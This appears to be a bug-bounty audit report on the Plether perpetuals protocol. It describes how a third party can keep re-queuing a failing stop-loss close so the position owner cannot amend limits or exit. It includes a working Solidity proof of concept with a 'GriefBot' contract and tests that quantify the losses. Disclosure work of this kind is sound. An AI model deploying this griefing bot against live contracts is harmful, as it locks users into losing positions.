# \#100086 [SC-High] Permissionless `retryPositionProtectionClose` lets anyone re-queue a failing TP/SL close in the same transaction, blocking the owner's documented amend-limits recovery and keeping the position locked

**Submitted on Nov 16th 2026 at 08:03:14 UTC by @sh15h4nk for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100086
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

When a triggered TP/SL close fails a stored close limit (for example, a price gap pushes execution notional above `maxExecutionNotionalAssets`), the protection becomes `Latched`. The docs say the owner "may amend its limits before retrying". Amend requires `Latched` **and** zero pending orders. Retry needs no caller check and re-queues the same unmeetable limits. A third party can therefore end each failing attempt (`executeOrder`, or the oracle-free `expireOrder` after the deadline) and call retry in the same transaction. The state that amend requires then never exists at a transaction boundary. Meanwhile the owner cannot amend, cancel or close, and the position stays open while the price moves against it.


## Vulnerability Details

1. **Amend needs `Latched` and no pending order** ([PositionProtectionBook.sol#L315-L327](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L327)):

```solidity
if (protection.status != PositionProtectionStatus.Latched) revert OrderRouter__ProtectionNotLatched();
if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) revert OrderRouter__PendingOrdersExist();
_setCloseLimits(protection, limits);
```

2. **Retry is callable by anyone and re-queues the old limits.** `retryPositionProtectionClose` ([#L382-L406](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406)) uses `_activeProtection`, not `_ownedActiveProtection` ([#L985-L1000](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L985-L1000)). It gives the owner no priority and has no cooldown. `_recordCloseAttempt` sets the status back to `Triggered` ([#L564-L578](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L578)).

3. **Anyone can end the live attempt.** A failed attempt relatches while the side and size still match ([#L658-L668](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L658-L668)). Both `ConstraintViolation` and `Expired` count as failures ([#L1017-L1022](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L1017-L1022)). `expireOrder` checks only `block.timestamp > executionDeadline`, with no role and no oracle data ([OrderRecoverySidecar.sol#L49-L64](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRecoverySidecar.sol#L49-L64)).

4. **The owner has no other exit while the status is `Triggered`.** Cancel and replace require `PendingOpen` or `Armed` ([#L408-L419](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L419), [#L265-L277](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L265-L277)). Cancel-and-commit-close requires `Armed` ([#L341-L350](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L341-L350)). `commitOrder` reverts `ProtectionActive` ([router/OrderLiquidationBatchLogic.sol#L313-L315](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315)). `_positionMatches` compares only size and side ([#L1010-L1015](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L1010-L1015)), so `addMargin` cannot break the match.

A contract that calls `executeOrder(attempt)` or `expireOrder(attempt)` and then `retryPositionProtectionClose(pid)` in one transaction leaves the protection `Triggered` with one pending order after every transaction. A price-driven limit such as the execution-notional ceiling (`sizeToLots(size) * price`, [CfdOrderPolicyEvaluatorBase.sol#L409](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L409)) fails again on each re-queued attempt. The cycle repeats every execution window (60 s at release), or faster through `executeOrder`.


## Impact Details

These figures come from the PoC with release risk parameters. ALICE holds a 10,000 USDG LONG with 2,000 USDG margin, a stop-loss at 1.05 and `maxExecutionNotionalAssets = 10,600 USDG`. The market gaps to 1.08 (notional 10,800 USDG, above the ceiling).

| Scenario | Exit price | Owner total loss |
|---|---|---|
| Control: honest keeper settles the attempt without retrying, owner amends | 1.08 | 808.72 USDG |
| Attack: griefer runs 4 `executeOrder`+retry rounds and 1 `expireOrder`+retry round while the price drifts | 1.16 | 1,609.04 USDG |

- After every griefer round, the PoC asserts that the owner's amend, cancel and `commitOrder(close)` all revert and that the position is still open.
- The position's margin and PnL cannot be exited. If the price keeps moving, the position can drift into liquidation. Free settlement balance stays withdrawable.
- The griefer pays only gas. Retry attempts carry a zero bounty. The griefer earns nothing, which makes this griefing.

**Preconditions and limits:**
- The protection needs a stored limit that the current market violates and that the owner cannot cure while an attempt is pending. Examples are the execution-notional or gross-debit ceiling after a gap, or the explicit-fee ceiling while the oracle is frozen (the 50 bps frozen close spread counts toward fees).
- This is a race the owner can contest. After an attempt ends, the owner can amend in the next transaction if that transaction lands before the griefer's retry. A griefer bot that bundles both calls atomically, plus FCFS backrunning on Arbitrum, makes this hard for a normal wallet user. A scripted or smart-account owner may win. The loss depends on the price path, as the extra ~800 USDG above shows.

## References

- PositionProtectionBook.sol: [amend #L315-L327](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L327), [retry #L382-L406](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406), [_cancel #L408-L419](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L419), [_recordCloseAttempt #L564-L578](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L578), [relatch #L658-L668](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L658-L668), [_activeProtection #L993-L1000](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L993-L1000), [failure reasons #L1017-L1022](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L1017-L1022)
- [OrderRecoverySidecar.sol#L49-L64](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRecoverySidecar.sol#L49-L64) (`expireOrder`, oracle-free, permissionless)
- [router/OrderLiquidationBatchLogic.sol#L313-L315](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315) (`ProtectionActive` commit lock)
- [CfdOrderPolicyEvaluatorBase.sol#L409](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L409) (price-driven execution notional)


## Proof of Concept

## Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Griefer bot: an unprivileged contract that bundles "finish the doomed attempt" and "re-queue it" in one
///         transaction, so no block boundary ever shows `Latched` with zero pending orders.
contract GriefBot {

    function executeAndRequeue(
        address router,
        address book,
        uint64 attemptId,
        uint64 protectionId,
        bytes[] calldata pythData
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 newAttemptId) {
        result = IPerpsKeeper(router).executeOrder(attemptId, pythData);
        newAttemptId = IPositionProtectionActions(book).retryPositionProtectionClose(protectionId);
    }

    function expireAndRequeue(
        address router,
        address book,
        uint64 attemptId,
        uint64 protectionId
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 newAttemptId) {
        result = IPerpsKeeper(router).expireOrder(attemptId);
        newAttemptId = IPositionProtectionActions(book).retryPositionProtectionClose(protectionId);
    }

}

/// @notice A08-L1: a third party keeps a Latched protection owner from using the documented amend-limits exit.
/// @dev Every exploit step uses production entry points (`commitOrder`, `executeOrder`, `expireOrder`,
///      `createPositionProtection`, `triggerPositionProtection`, `retryPositionProtectionClose`) called by untrusted
///      addresses. No protocol role is pranked. The opening trade also goes through the public router.
contract A08L1ProtectionRequeueGriefPoC is BasePerpTest {

    address private constant ALICE = address(0xA11CE); // protection owner
    address private constant KEEPER = address(0xC0FFEE); // honest unprivileged keeper
    address private constant TRIGGER_KEEPER = address(0x7106);
    address private constant GRIEFER = address(0xBADBAD);

    uint256 private constant ENTRY_PRICE = 100_000_000; // 1.00
    uint256 private constant STOP_LOSS = 105_000_000; // LONG stop-loss fires at mark >= 1.05
    uint256 private constant GAP_PRICE = 108_000_000; // market gaps through the stop to 1.08
    uint256 private constant POSITION_SIZE = 10_000e18; // 100 lots, 10,000 USDG notional at 1.00
    uint256 private constant MARGIN = 2000e6;
    // Owner caps execution notional at 1.06 * size (a 1% slippage ceiling over the 1.05 trigger).
    uint256 private constant NOTIONAL_CEILING = 10_600e6;

    IPositionProtectionActions private actions;
    IPositionProtectionViews private views;
    GriefBot private bot;
    uint256 private clientNonce;

    // Release risk parameters from packages/perps/DEPLOYMENT.md "Initial release parameters".
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        actions = IPositionProtectionActions(address(router.positionProtectionBook()));
        views = IPositionProtectionViews(address(router.positionProtectionBook()));
        vm.prank(GRIEFER);
        bot = new GriefBot();
        _fundTrader(ALICE, 20_000e6);
    }

    // ------------------------------------------------------------------------------------------------
    // Control: no griefer. The first doomed attempt is settled by an honest keeper without re-queuing.
    // The owner amends, any keeper retries, and the position closes at the gap price.
    // ------------------------------------------------------------------------------------------------
    function test_Control_OwnerAmendsAndExitsAtGap() public {
        uint256 balanceStart = clearinghouse.balanceAssets(ALICE);
        (uint64 pid, uint64 attempt) = _openProtectAndTrigger();

        bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attempt, data);
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "doomed attempt");
        assertEq(_status(pid), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");
        assertEq(router.pendingOrderCounts(ALICE), 0, "no pending order");

        vm.prank(ALICE);
        actions.amendLatchedPositionProtectionCloseLimits(pid, _wideLimits());

        vm.prank(KEEPER);
        uint64 retry = actions.retryPositionProtectionClose(pid);
        data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(KEEPER);
        r = router.executeOrder(retry, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "position closed");

        uint256 loss = balanceStart - clearinghouse.balanceAssets(ALICE);
        emit log_named_decimal_uint("CONTROL: owner exit price", GAP_PRICE, 8);
        emit log_named_decimal_uint("CONTROL: owner total loss (USDG)", loss, 6);
    }

    // ------------------------------------------------------------------------------------------------
    // Attack: the griefer finishes each doomed attempt and re-queues it in the same transaction.
    // ------------------------------------------------------------------------------------------------
    function test_Attack_GrieferBlocksAmendAcrossWindows() public {
        uint256 balanceStart = clearinghouse.balanceAssets(ALICE);
        (uint64 pid, uint64 attempt) = _openProtectAndTrigger();
        uint256 lockStart = vm.getBlockTimestamp();

        // Market keeps drifting against the LONG while it is locked: 1.08, 1.10, 1.12, 1.14, then an expiry round.
        uint256[4] memory prices = [uint256(108_000_000), 110_000_000, 112_000_000, 114_000_000];
        for (uint256 i; i < prices.length; ++i) {
            bytes[] memory data = _mockPythUpdateData(prices[i]);
            vm.prank(GRIEFER);
            (OrderV3Types.ExecutionResult memory r, uint64 next) =
                bot.executeAndRequeue(address(router), address(actions), attempt, pid, data);
            assertEq(
                uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "attempt fails"
            );
            attempt = next;
            _assertOwnerLockedOut(pid);
            emit log_named_decimal_uint("round price (attempt failed, re-queued by griefer)", prices[i], 8);
        }

        // Oracle-free variant: let the attempt reach its deadline, then expire + re-queue atomically.
        vm.warp(uint256(router.lifecycleBook().orderTiming(attempt).executionDeadline) + 1);
        vm.prank(GRIEFER);
        (OrderV3Types.ExecutionResult memory er, uint64 afterExpiry) =
            bot.expireAndRequeue(address(router), address(actions), attempt, pid);
        assertEq(uint8(er.terminalReason), uint8(OrderV3Types.TerminalReason.Expired), "attempt expired");
        attempt = afterExpiry;
        _assertOwnerLockedOut(pid);

        // Griefer stops. Price is now 1.16. An honest keeper settles the last attempt without re-queuing.
        uint256 finalPrice = 116_000_000;
        bytes[] memory last = _mockPythUpdateData(finalPrice);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory lr = router.executeOrder(attempt, last);
        assertEq(uint8(lr.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        uint256 lockedSeconds = vm.getBlockTimestamp() - lockStart;

        vm.prank(ALICE);
        actions.amendLatchedPositionProtectionCloseLimits(pid, _wideLimits());
        vm.prank(KEEPER);
        uint64 retry = actions.retryPositionProtectionClose(pid);
        bytes[] memory data2 = _mockPythUpdateData(finalPrice);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory fr = router.executeOrder(retry, data2);
        assertEq(uint8(fr.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "closed only after griefer stops");

        uint256 loss = balanceStart - clearinghouse.balanceAssets(ALICE);
        emit log_named_uint("ATTACK: griefer rounds (4 execute + 1 expire)", 5);
        emit log_named_uint("ATTACK: seconds owner was locked out", lockedSeconds);
        emit log_named_uint("ATTACK: griefer token cost (gas only)", 0);
        emit log_named_decimal_uint("ATTACK: owner exit price", finalPrice, 8);
        emit log_named_decimal_uint("ATTACK: owner total loss (USDG)", loss, 6);
    }

    // --- helpers ---

    function _assertOwnerLockedOut(
        uint64 pid
    ) private {
        assertEq(_status(pid), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "re-triggered");
        assertEq(router.pendingOrderCounts(ALICE), 1, "one live attempt at every boundary");

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        actions.amendLatchedPositionProtectionCloseLimits(pid, _wideLimits());

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        actions.cancelPositionProtection(pid);

        OrderV3Types.OrderRequest memory close = _baseRequest(CfdTypes.Side.LONG, POSITION_SIZE, true);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(close);

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "position still open");
    }

    function _openProtectAndTrigger() private returns (uint64 pid, uint64 attempt) {
        OrderV3Types.OrderRequest memory open = _baseRequest(CfdTypes.Side.LONG, POSITION_SIZE, false);
        open.marginDelta = MARGIN;
        vm.prank(ALICE);
        uint64 id = router.commitOrder(open);
        bytes[] memory data = _mockPythUpdateData(ENTRY_PRICE);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executes");

        // Any keeper pushes a live accepted basket (permissionless), which protection creation requires.
        vm.warp(uint256(engine.lastMarkTime()) + 1);
        vm.prank(KEEPER);
        router.updateMarkPrice(_livePriceData(ENTRY_PRICE));

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP_LOSS;
        params.closeLimits = _wideLimits();
        params.closeLimits.maxExecutionNotionalAssets = NOTIONAL_CEILING;
        vm.prank(ALICE);
        pid = actions.createPositionProtection(params);

        // Market gaps through the stop.
        _mockPythUpdateData(GAP_PRICE);
        vm.prank(TRIGGER_KEEPER);
        attempt = actions.triggerPositionProtection(pid, _livePriceData(GAP_PRICE));
        assertEq(_status(pid), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "triggered");
        emit log_named_uint("router.maxExecutionWindowSeconds", router.maxExecutionWindowSeconds());
        emit log_named_uint("router.positionProtectionTriggerBountyAssets", router.positionProtectionTriggerBountyAssets());
    }

    function _status(
        uint64 pid
    ) private view returns (uint8) {
        return uint8(views.getPositionProtection(pid).status);
    }

    function _wideLimits() private pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _livePriceData(
        uint256 price
    ) private view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _baseRequest(
        CfdTypes.Side side,
        uint256 size,
        bool isClose
    ) private returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256(abi.encode("A08-L1", ++clientNonce));
        request.side = side;
        request.sizeDelta = size;
        request.isClose = isClose;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

}

```
